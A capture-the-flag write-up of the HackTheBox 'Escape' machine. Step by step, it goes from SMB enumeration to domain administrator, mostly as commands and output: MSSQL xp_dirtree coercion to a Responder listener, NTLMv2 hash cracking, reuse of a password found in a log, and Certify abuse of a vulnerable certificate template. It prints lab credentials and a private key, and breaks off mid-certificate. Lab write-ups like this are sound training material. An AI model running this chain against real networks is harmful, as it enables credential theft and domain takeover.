---
title: HTB - Escape
date: 2024-01-01
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, nmap, escape, certify, rubeus, smb, mssql, responder, xp_dirtree, ntlm, hash, hashcat, kerberos, tgt, psexec]
img_path: /assets/htb/fullpwn/escape/
published: true
---

![room_banner](room_banner.png)

## Overview

|:-:|:-:|
|Machine|[Escape](https://app.hackthebox.com/machines/531)|
|Rank|Medium|
|Focus|crackmapexec, certificates, kerberos|

## Initial foothold

1. Let's start with a port-scan:

  ```shell
  # port scanning with nmap
  $ sudo nmap -sS -sC -sV -O -Pn --min-rate 10000 -p- escape

  PORT      STATE SERVICE       VERSION
  53/tcp    open  domain        Simple DNS Plus
  88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-01 21:22:15Z)
  135/tcp   open  msrpc         Microsoft Windows RPC
  139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
  389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
  |_ssl-date: 2024-01-01T21:23:49+00:00; +8h00m00s from scanner time.
  | ssl-cert: Subject: commonName=dc.sequel.htb
  | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
  | Not valid before: 2024-01-01T21:12:03
  |_Not valid after:  2024-12-31T21:12:03
  445/tcp   open  microsoft-ds?
  464/tcp   open  kpasswd5?
  593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
  636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
  |_ssl-date: 2024-01-01T21:23:48+00:00; +7h59m59s from scanner time.
  | ssl-cert: Subject: commonName=dc.sequel.htb
  | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
  | Not valid before: 2024-01-01T21:12:03
  |_Not valid after:  2024-12-31T21:12:03
  1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
  | ms-sql-info:
  |   10.10.11.202:1433:
  |     Version:
  |       name: Microsoft SQL Server 2019 RTM
  |       number: 15.00.2000.00
  |       Product: Microsoft SQL Server 2019
  |       Service pack level: RTM
  |       Post-SP patches applied: false
  |_    TCP port: 1433
  |_ssl-date: 2024-01-01T21:23:49+00:00; +8h00m00s from scanner time.
  | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
  | Not valid before: 2024-01-01T21:21:37
  |_Not valid after:  2054-01-01T21:21:37
  | ms-sql-ntlm-info:
  |   10.10.11.202:1433:
  |     Target_Name: sequel
  |     NetBIOS_Domain_Name: sequel
  |     NetBIOS_Computer_Name: DC
  |     DNS_Domain_Name: sequel.htb
  |     DNS_Computer_Name: dc.sequel.htb
  |     DNS_Tree_Name: sequel.htb
  |_    Product_Version: 10.0.17763
  3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
  |_ssl-date: 2024-01-01T21:23:49+00:00; +8h00m00s from scanner time.
  | ssl-cert: Subject: commonName=dc.sequel.htb
  | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
  | Not valid before: 2024-01-01T21:12:03
  |_Not valid after:  2024-12-31T21:12:03
  3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
  |_ssl-date: 2024-01-01T21:23:48+00:00; +7h59m59s from scanner time.
  | ssl-cert: Subject: commonName=dc.sequel.htb
  | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
  | Not valid before: 2024-01-01T21:12:03
  |_Not valid after:  2024-12-31T21:12:03
  5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  |_http-server-header: Microsoft-HTTPAPI/2.0
  |_http-title: Not Found
  9389/tcp  open  mc-nmf        .NET Message Framing
  49667/tcp open  msrpc         Microsoft Windows RPC
  49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
  49674/tcp open  msrpc         Microsoft Windows RPC
  49686/tcp open  msrpc         Microsoft Windows RPC
  49723/tcp open  msrpc         Microsoft Windows RPC

  Device type: general purpose
  Running (JUST GUESSING): Microsoft Windows 2019 (89%)
  Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
  ```

2. From Nmap's output, we can see a domain name: `sequel.htb0`, as well as an alternative name: `dc.sequel.htb`. So let's add those into our `/etc/hosts` file:

  ![](domain_names_hosts.png)

3. There is an SMB server on port 445 listening, so we could try enumerating that using `crackmapexec`:

  ```shell
  # enumerating shares and permissions with crackmapexec
  $ crackmapexec smb escape --shares -u 'test' -p ''
  SMB         escape          445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
  SMB         escape          445    DC               [+] sequel.htb\test:
  SMB         escape          445    DC               [+] Enumerated shares
  SMB         escape          445    DC               Share           Permissions     Remark
  SMB         escape          445    DC               -----           -----------     ------
  SMB         escape          445    DC               ADMIN$                          Remote Admin
  SMB         escape          445    DC               C$                              Default share
  SMB         escape          445    DC               IPC$            READ            Remote IPC
  SMB         escape          445    DC               NETLOGON                        Logon server share
  SMB         escape          445    DC               Public          READ
  SMB         escape          445    DC               SYSVOL                          Logon server share
  ```
  
  > We must pass a random username for the above command to work.

4. Since we have `READ` permissions on the `Public` share we can connect to it and see what's inside:

  ```shell
  # connecting the to Public share
  $ smbclient //escape/Public
  Password for [WORKGROUP\kali]:
  Try "help" to get a list of possible commands.
  smb: \> dir
    .                                   D        0  Sat Nov 19 11:51:25 2022
    ..                                  D        0  Sat Nov 19 11:51:25 2022
    SQL Server Procedures.pdf           A    49551  Fri Nov 18 13:39:43 2022

                  5184255 blocks of size 4096. 1475378 blocks available
  smb: \> get "SQL Server Procedures.pdf"
  getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (348.1 KiloBytes/sec) (average 348.1 KiloBytes/sec)
  ```

5. The PDF file contains instructions on how to connect to the SQL server:

  ```shell
  # opening the PDF file
  $ open SQL\ Server\ Procedures.pdf
  ```

  ![](pdf_content.png)

6. We can first check if we can login with the provided creds using local authentication (PDF referred to as *SQL Server Authentication*):

  ```shell
  # checking mssql creds
  $ crackmapexec mssql escape -u 'PublicUser' -p 'GuestUserCantWrite1' --local-auth
  MSSQL       escape          1433   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:DC)
  MSSQL       escape          1433   DC               [+] PublicUser:GuestUserCantWrite1
  ```

  These creds are indeed valid, so let's connect to it:

  ```shell
  $ mssqlclient.py -p 1433 PublicUser@escape
  /usr/local/bin/mssqlclient.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
    __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20231027.123703.c0e949fe', 'mssqlclient.py')
  Impacket v0.12.0.dev1+20231027.123703.c0e949fe - Copyright 2023 Fortra

  Password:
  [*] Encryption required, switching to TLS
  [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
  [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
  [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
  [*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
  [*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
  [*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
  [!] Press help for extra shell commands
  SQL (PublicUser  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
  ```

## Lateral privilege escalation

7. We can try capturing the MSSQL service hash using `xp_subdirs` or `xp_dirtree`.

  > The below process is demonstrating in the following module: Attacking Commong Services - [Attacking SQL Databases](https://academy.hackthebox.com/module/116/section/1169).

  ```shell
  # start a fake smb server
  $ sudo responder -I tun0
                                          __
    .----.-----.-----.-----.-----.-----.--|  |.-----.----.
    |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
    |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                    |__|

  <SNIP>

  [+] Servers:
      HTTP server                [ON]
      HTTPS server               [ON]
      WPAD proxy                 [OFF]
      Auth proxy                 [OFF]
      SMB server                 [ON] # our fake SMB server
      Kerberos server            [ON]
      SQL server                 [ON]
      FTP server                 [ON]
      IMAP server                [ON]
      POP3 server                [ON]
      SMTP server                [ON]
      DNS server                 [ON]
      LDAP server                [ON]
      RDP server                 [ON]
      DCE-RPC server             [ON]
      WinRM server               [ON]

  <SNIP>

  [+] Generic Options:
      Responder NIC              [tun0]
      Responder IP               [10.10.14.6]
      Responder IPv6             [dead:beef:2::1004]
      Challenge set              [random]
      Don't Respond To Names     ['ISATAP']

  [+] Current Session Variables:
      Responder Machine Name     [WIN-KFDT5TK1LBB]
      Responder Domain Name      [U69C.LOCAL]
      Responder DCE-RPC Port     [48148]

  [+] Listening for events...
  ```

  ```shell
  # force MSSQL to connect to the fake SMB server
  SQL (PublicUser  guest@master)> xp_dirtree \\10.10.14.6\fake\share
  ```

  ```shell
  # grab the hash of the MSSQL service
  [+] Listening for events...

  [SMB] NTLMv2-SSP Client   : 10.10.11.202
  [SMB] NTLMv2-SSP Username : sequel\sql_svc
  [SMB] NTLMv2-SSP Hash     : sql_svc::sequel:5a468d462566c8f2:969AC4350349119AFF80E5F157947705:010100000000000000F49497CB3CDA0171C9C617170C770A0000000002000800550036003900430001001E00570049004E002D004B00460044005400350054004B0031004C004200420004003400570049004E002D004B00460044005400350054004B0031004C00420042002E0055003600390043002E004C004F00430041004C000300140055003600390043002E004C004F00430041004C000500140055003600390043002E004C004F00430041004C000700080000F49497CB3CDA010600040002000000080030003000000000000000000000000030000053D56BD90CEC18B19DACD970F3D395DA99593D1D611EFCDEEDC06434B9D0792A0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0036000000000000000000
  ```

8. Now we can attempt to crack the obtained NTLMv2 hash:

  ```shell
  # copy hash into a text file
  $ echo "sql_svc::sequel:5a468d462566c8f2:969AC4350349119AFF80E5F157947705:010100000000000000F49497CB3CDA0171C9C617170C770A0000000002000800550036003900430001001E00570049004E002D004B00460044005400350054004B0031004C004200420004003400570049004E002D004B00460044005400350054004B0031004C00420042002E0055003600390043002E004C004F00430041004C000300140055003600390043002E004C004F00430041004C000500140055003600390043002E004C004F00430041004C000700080000F49497CB3CDA010600040002000000080030003000000000000000000000000030000053D56BD90CEC18B19DACD970F3D395DA99593D1D611EFCDEEDC06434B9D0792A0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0036000000000000000000" > sql_hash
  
  # use hashcat to crack the NTLMv2 hash
  $ hashcat -m 5600 sql_hash /usr/share/wordlists/rockyou.txt
  hashcat (v6.2.6) starting

  <SNIP>

  Dictionary cache hit:
  * Filename..: /usr/share/wordlists/rockyou.txt
  * Passwords.: 14344385
  * Bytes.....: 139921507
  * Keyspace..: 14344385

  SQL_SVC::sequel:5a468d462566c8f2:969ac4350349119aff80e5f157947705:010100000000000000f49497cb3cda0171c9c617170c770a0000000002000800550036003900430001001e00570049004e002d004b00460044005400350054004b0031004c004200420004003400570049004e002d004b00460044005400350054004b0031004c00420042002e0055003600390043002e004c004f00430041004c000300140055003600390043002e004c004f00430041004c000500140055003600390043002e004c004f00430041004c000700080000f49497cb3cda010600040002000000080030003000000000000000000000000030000053d56bd90cec18b19dacd970f3d395da99593d1d611efcdeedc06434b9d0792a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0036000000000000000000:REGGIE1234ronnie

  Session..........: hashcat
  Status...........: Cracked
  Hash.Mode........: 5600 (NetNTLMv2)
  Hash.Target......: SQL_SVC::sequel:5a468d462566c8f2:969ac4350349119aff...000000
  Time.Started.....: Mon Jan  1 16:08:45 2024 (4 secs)
  Time.Estimated...: Mon Jan  1 16:08:49 2024 (0 secs)
  Kernel.Feature...: Pure Kernel
  Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
  Guess.Queue......: 1/1 (100.00%)
  Speed.#1.........:  3431.5 kH/s (0.97ms) @ Accel:512 Loops:1 Thr:1 Vec:16
  Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
  Progress.........: 10706944/14344385 (74.64%)
  Rejected.........: 0/10706944 (0.00%)
  Restore.Point....: 10698752/14344385 (74.58%)
  Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
  Candidate.Engine.: Device Generator
  Candidates.#1....: REPIN210 -> RAHRYA

  Started: Mon Jan  1 16:08:45 2024
  Stopped: Mon Jan  1 16:08:50 2024
  ```

9. We can now try the creds `sql_svc:REGGIE1234ronnie` to check if they can be used to any listening service, such as WinRM:

  ```shell
  # checking current creds on WinRM
  $ crackmapexec winrm escape -u 'sql_svc' -p 'REGGIE1234ronnie'
  SMB         escape          5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
  HTTP        escape          5985   DC               [*] http://escape:5985/wsman
  WINRM       escape          5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
  ```

## Lateral privilege escalation 2

10. Since that worked, let's log into WinRM and see what we can find. We will use [SharpCollection](https://github.com/Flangvik/SharpCollection)'s `Certify.exe` since we know that this machine is a certified authority to check for vulnerable cert templates. 

  We first need to transfer the executable into the target. We can do that by directly uploading using WinRM:

  ```shell
  # move into the directory where Cerfity.exe resides
  $ cd /opt/SharpCollection/NetFramework_4.7_Any/

  # copy the executable on the directory we stared WinRM from
  $ cp Certify.exe ~/htb/fullpwn/escape/
  ```

  Now, we need to login as `sql_svc` using `evil-winrm`, upload `certify.exe`, and then execute it:

  ```shell
  # logging in WinRM
  $ evil-winrm -i escape -u sql_svc -p REGGIE1234ronnie

  Evil-WinRM shell v3.5

  Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

  Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

  Info: Establishing connection to remote endpoint

  # uploading the executable on the target
  *Evil-WinRM* PS C:\Users\sql_svc\Documents> cd c:\programdata
  *Evil-WinRM* PS C:\programdata> upload Certify.exe

  Info: Uploading /home/kali/htb/fullpwn/escape/Certify.exe to C:\programdata\Certify.exe

  Data: 236884 bytes of 236884 bytes copied

  Info: Upload successful!

  # execute certify
  *Evil-WinRM* PS C:\programdata> ./Certify.exe

  <SNIP>

    Find vulnerable/abusable certificate templates using default low-privileged groups:

      Certify.exe find /vulnerable [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]

    Find vulnerable/abusable certificate templates using all groups the current user context is a part of:

      Certify.exe find /vulnerable /currentuser [/ca:SERVER\ca-name | /domain:domain.local | /ldapserver:server.domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]

  <SNIP>
  ```

  It found a `find /vulnerable` flag, so let's run that:

  ```shell
  # executing certify with the newly found flag
  *Evil-WinRM* PS C:\programdata> ./Certify.exe find /vulnerable

  [*] Action: Find certificate templates
  [*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

  [*] Listing info about the Enterprise CA 'sequel-DC-CA'

      Enterprise CA Name            : sequel-DC-CA
      DNS Hostname                  : dc.sequel.htb
      FullName                      : dc.sequel.htb\sequel-DC-CA
      Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
      Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
      Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
      Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
      Cert Start Date               : 11/18/2022 12:58:46 PM
      Cert End Date                 : 11/18/2121 1:08:46 PM
      Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
      UserSpecifiedSAN              : Disabled
      CA Permissions                :
        Owner: BUILTIN\Administrators        S-1-5-32-544

        Access Rights                                     Principal

        Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
        Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
        Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
        Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Enrollment Agent Restrictions : None

  [+] No Vulnerable Certificates Templates found!

  Certify completed in 00:00:09.7859873
  ```

11. It seems that we did not get much information from using `certify` as it found no vulnerable certificate templates. We can continue by enumerating the machine for further exploitation avenues:

  ```shell
  # enumerating the machine
  *Evil-WinRM* PS C:\Users\sql_svc> cd /
  *Evil-WinRM* PS C:\> ls

      Directory: C:\

  Mode                LastWriteTime         Length Name
  ----                -------------         ------ ----
  d-----         2/1/2023   8:15 PM                PerfLogs
  d-r---         2/6/2023  12:08 PM                Program Files
  d-----       11/19/2022   3:51 AM                Program Files (x86)
  d-----       11/19/2022   3:51 AM                Public
  d-----         2/1/2023   1:02 PM                SQLServer
  d-r---         2/1/2023   1:55 PM                Users
  d-----         2/6/2023   7:21 AM                Windows


  *Evil-WinRM* PS C:\> cd SQLServer
  *Evil-WinRM* PS C:\SQLServer> ls

      Directory: C:\SQLServer

  Mode                LastWriteTime         Length Name
  ----                -------------         ------ ----
  d-----         2/7/2023   8:06 AM                Logs
  d-----       11/18/2022   1:37 PM                SQLEXPR_2019
  -a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
  -a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe


  *Evil-WinRM* PS C:\SQLServer> cd Logs
  *Evil-WinRM* PS C:\SQLServer\Logs> ls

      Directory: C:\SQLServer\Logs

  Mode                LastWriteTime         Length Name
  ----                -------------         ------ ----
  -a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK


  *Evil-WinRM* PS C:\SQLServer\Logs> type ERRORLOG.BAK
  2022-11-18 13:43:05.96 Server      Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
          Sep 24 2019 13:48:23
          Copyright (C) 2019 Microsoft Corporation
          Express Edition (64-bit) on Windows Server 2019 Standard Evaluation 10.0 <X64> (Build 17763: ) (Hypervisor)

  <SNIP>
  2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
  2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
  2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
  <SNIP>
  ```

11. Based on the log info we can deduce the following:
  1. The user `ryan.cooper` tried to login with the wrong password.
  2. Then he probably thought that his username was saved, thus, he typed directly his password.
  
  So we can check if the creds `ryan.cooper:NuclearMosquito3` get us anywhere, such a WinRM login:

  ```shell
  # check creds at the WinRM server
  $ crackmapexec winrm escape -u ryan.cooper -p NuclearMosquito3
  SMB         escape          5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
  HTTP        escape          5985   DC               [*] http://escape:5985/wsman
  WINRM       escape          5985   DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 (Pwn3d!)
  ```

12. Let's login as `ryan.cooper` and try to repeat the process using `certify.exe` now:

  ```shell
  # loggin in WinRM with the newly obtained creds
  $ evil-winrm -i escape -u ryan.cooper -p NuclearMosquito3

  Evil-WinRM shell v3.5

  Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

  Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

  Info: Establishing connection to remote endpoint
  *Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> cd c:\programdata
  *Evil-WinRM* PS C:\programdata> .\certify.exe find /vulnerable

  [*] Action: Find certificate templates
  [*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

  [*] Listing info about the Enterprise CA 'sequel-DC-CA'

      Enterprise CA Name            : sequel-DC-CA
      DNS Hostname                  : dc.sequel.htb
      FullName                      : dc.sequel.htb\sequel-DC-CA
      Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
      Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
      Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
      Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
      Cert Start Date               : 11/18/2022 12:58:46 PM
      Cert End Date                 : 11/18/2121 1:08:46 PM
      Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
      UserSpecifiedSAN              : Disabled
      CA Permissions                :
        Owner: BUILTIN\Administrators        S-1-5-32-544

        Access Rights                                     Principal

        Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
        Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
        Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
        Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Enrollment Agent Restrictions : None

  [!] Vulnerable Certificates Templates :

      CA Name                               : dc.sequel.htb\sequel-DC-CA
      Template Name                         : UserAuthentication
      Schema Version                        : 2
      Validity Period                       : 10 years
      Renewal Period                        : 6 weeks
      msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
      mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
      Authorized Signatures Required        : 0
      pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
      mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
      Permissions
        Enrollment Permissions
          Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                        sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                        sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        Object Control Permissions
          Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
          WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                        sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                        sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
          WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                        sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                        sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
          WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                        sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                        sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519

  Certify completed in 00:00:09.5542991
  ```

  This time it seems that it managed to find a vulnerable certificate template called `UserAuthentication`.

## Vertical privilege escalation

13. We can now visit the [Certify's GitHub page](https://github.com/GhostPack/Certify) which includes details instructions on what we can do when we find a vulnerable cert template. There are 3 potential scenarios listed on this page, and we currently are on the third one (*VulnTemplate*). Luckily for us, they show the abuse of scenario 3 step by step:

  ![](certify_github.png)

  ```shell
  # check users
  *Evil-WinRM* PS C:\programdata> net user

  User accounts for \\

  -------------------------------------------------------------------------------
  Administrator            Brandon.Brown            Guest
  James.Roberts            krbtgt                   Nicole.Thompson
  Ryan.Cooper              sql_svc                  Tom.Henn
  The command completed with one or more errors.

  # requesting a ticket for the user 'administrator'
  *Evil-WinRM* PS C:\programdata> .\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

  [*] Action: Request a Certificates

  [*] Current user context    : sequel\Ryan.Cooper
  [*] No subject name specified, using current context as subject.

  [*] Template                : UserAuthentication
  [*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
  [*] AltName                 : Administrator

  [*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

  [*] CA Response             : The certificate had been issued.
  [*] Request ID              : 11

  [*] cert.pem         :

  -----BEGIN RSA PRIVATE KEY-----
  MIIEowIBAAKCAQEAxIKp5HIRo+sJt8Qkf0GaWHGg2RZI/xNELUDw3ezwywdW6oyr
  x9LqCHyiPLI3C8iMXCrTCyuBEAjSKhEDpW3H2sPpvgF+CUGEzpNWEjXpjlGcNFbS
  RAGekffAc1GKBZ48cWyCfFMpJO4QEM8pVqHhMdEaQa9cRBEJin84k/+yyN6qKajq
  UDgtcPTH6y1VfmF4pnO3VekJCvTZahLkz5qADpIBi4y/CODVmjxOwgqFOtZSz5tH
  C6ijMj8Dl+gDRJVaeqiYgHkd8GgNYGpfRNM/7jeuYgT2FFsXgx6L+gwdnyW7obAc
  fzEt557OQRv2965v6Uuka+2IenSt+Cq466DT2QIDAQABAoIBAHjBEkUfE1f3BnG2
  RfctCPtwV7cOyqxz2mE0ls7I2u7oA7D94FFaehXdAJTrroe/JQE+D5G9mgGQahUP
  f34Yh8cWvHvVzu1BJasLPsjR+ENMQwCmmW7Qz/BCnjA+2uG46suIMmbTc2UOJTEv
  G+fwccF7DPdwGvJ4xbQlmU7YwbRMi8d2u6sO63qD3AwJ98Ogya0MReE/voaJGLVV
  iPd9T2QrNnYyNmPxvFqC0SzOou9RpIejMhagvtzYtachwvYZIzdbsk/+XdxcSwhU
  86pcjeHnIXbldM3Ct3X6+3S6gkRCEt2njBZyG1TIA6KARAglVPYbbRodxKDk6+H4
  fvHBFEECgYEA18O4f1wUkgc2TJXVBhUboUWw9v7SqtPQNgNtyTYWhIC++2YP1Bz4
  YRWAkqw9RIPwYK8xFe6ujBdhsxIGaXuRDpSSaikCZG8IqgGsP7gpTKcG+Trhxw5S
  OOtAU+nap3zPZLGOdF0s5XRn3ildNC2WHZ6mAWor38Oe+QZMH1xiPo8CgYEA6SfH
  gtgAEb3ccav2V0IPi9KI3FNj3wo9w9scukieE/Rhcys67j0fEhawrQji0Q04NBOM
  6g7sUyDRMgLveHoDoIRaD40pVpOdljHjrdgHRCVkJpH9LA23eDglGcGI4t5ESrwX
  oJ6E7s0agfo5lUW2fxKAZB2oPWuckTOLmZiZ+xcCgYEAyXMmnlrVpeXv759xLmWk
  z3VnHaWcAf0TiGq5JUVHztz583U+UBfgW5yc19TSu1bIpyzLEqQv+gKWqH+q1u+U
  5t0WuuGhJy54E2rObQvAG55TJ32vcY/Qeu5CuFY+XWRtqqEQ1VptYarGk6lhKSdq
  4irO6cE8R4a4td8IUbuKyscCgYBEPf5pT6uFhdq18q0hkRZXyIGCa2355Fd7sfBQ
  ndyW3pp/SRHwlTc45idEHiu1IHdo1qgSAdgt5JcWWkGZM61IGDT8BEcrLf2b7nJD
  ec12prMPjv9ZG5Ktv1EsnrbgIEpAzZjkzEEAXEv76y9bf5IQ02t84ilSAONMpJeh
  l0bKdQKBgE1besdGkhn7jMQmcgm2eUlrsXPMCqVWcpitw0ewgTCCSLcZOgCs6Q5r
  fkApGLUP3Sw/wNEbF3qx7mejnzcX7grNszbCOhLFfAMl1KXCNAECN1nsaSu0tmIg
  TUO1bCSyvLkmS/CGqZdTFhjvZV4Isw8FyNahhzo285fhDgbHYCWh
  -----END RSA PRIVATE KEY-----
  -----BEGIN CERTIFICATE-----
  MIIGEjCCBPqgAwIBAgITHgAAAAt6vFcdcvEhWwAAAAAACzANBgkqhkiG9w0BAQsF
  ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
  MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjQwMTAyMDEwMjExWhcNMjYwMTAy
  MDExMjExWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
  c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
  MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDEgqnkchGj6wm3xCR/QZpYcaDZ
  Fkj/E0QtQPDd7PDLB1bqjKvH0uoIfKI8sjcLyIxcKtMLK4EQCNIqEQOlbcfaw+m+
  AX4JQYTOk1YSNemOUZw0VtJEAZ6R98BzUYoFnjxxbIJ8Uykk7hAQzylWoeEx0RpB
  r1xEEQmKfziT/7LI3qopqOpQOC1w9MfrLVV+YXimc7dV6QkK9NlqEuTPmoAOkgGL
  jL8I4NWaPE7CCoU61lLPm0cLqKMyPwOX6ANElVp6qJiAeR3waA1gal9E0z/uN65i
  BPYUWxeDHov6DB2fJbuhsBx/MS3nns5BG/b3rm/pS6Rr7Yh6dK34KrjroNPZAgMB
  AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
